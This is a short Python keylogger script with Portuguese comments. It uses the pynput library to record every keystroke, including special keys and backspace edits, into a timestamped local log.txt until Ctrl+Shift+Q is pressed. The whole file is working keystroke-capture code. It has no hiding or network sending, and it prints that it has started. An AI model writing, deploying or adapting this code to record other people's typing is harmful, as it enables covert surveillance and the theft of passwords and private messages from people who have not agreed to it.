import time
from pynput import keyboard

# Configurações
LOG_FILE = "log.txt"
BUFFER_SIZE = 10  # Escrever no arquivo a cada 10 teclas para melhorar performance
STOP_SEQUENCE = ["ctrl", "shift", "q"]  # Combinação para parar: Ctrl+Shift+Q

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd,
    keyboard.Key.num_lock,
    keyboard.Key.scroll_lock
}

# Buffer para armazenar teclas e melhorar performance
buffer = []
pressed_keys = set()  # Para detectar combinações
stop_flag = False

def write_buffer():
    """Escreve o buffer no arquivo de log."""
    if buffer:
        try:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                timestamp = time.strftime("[%Y-%m-%d %H:%M:%S] ")
                f.write(timestamp + "".join(buffer) + "\n")
            buffer.clear()
        except Exception as e:
            print(f"Erro ao escrever no log: {e}")

def on_press(key):
    global stop_flag
    try:
        key_name = key.char.lower() if hasattr(key, 'char') and key.char else str(key).replace("Key.", "")
        pressed_keys.add(key_name)

        # Verificar combinação de parada
        if all(k in pressed_keys for k in STOP_SEQUENCE):
            stop_flag = True
            return False  # Para o listener

        if key in IGNORAR:
            return

        if hasattr(key, 'char') and key.char:
            buffer.append(key.char)
        else:
            if key == keyboard.Key.space:
                buffer.append(" ")
            elif key == keyboard.Key.enter:
                buffer.append("\n")
            elif key == keyboard.Key.tab:
                buffer.append("\t")
            elif key == keyboard.Key.backspace:
                if buffer:
                    buffer.pop()  # Remove último caractere do buffer
                else:
                    buffer.append("[BACKSPACE]")  # Se buffer vazio, loga
            elif key == keyboard.Key.esc:
                buffer.append(" [ESC] ")
            elif key == keyboard.Key.delete:
                buffer.append(" [DEL] ")
            elif key in [keyboard.Key.up, keyboard.Key.down, keyboard.Key.left, keyboard.Key.right]:
                buffer.append(f" [{str(key).replace('Key.', '').upper()}] ")
            elif str(key).startswith("Key.f"):
                buffer.append(f" [{str(key).replace('Key.', '').upper()}] ")
            else:
                buffer.append(f"[{key}]")

        # Escrever buffer se atingir tamanho
        if len(buffer) >= BUFFER_SIZE:
            write_buffer()

    except Exception as e:
        buffer.append(f"[ERROR: {e}]")

def on_release(key):
    try:
        key_name = key.char.lower() if hasattr(key, 'char') and key.char else str(key).replace("Key.", "")
        pressed_keys.discard(key_name)
    except:
        pass

# Listener com callbacks
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger iniciado. Pressione Ctrl+Shift+Q para parar.")
    listener.join()

# Escrever buffer restante ao sair
write_buffer()
if stop_flag:
    print("Keylogger parado via combinação de teclas.")
else:
    print("Keylogger parado.")





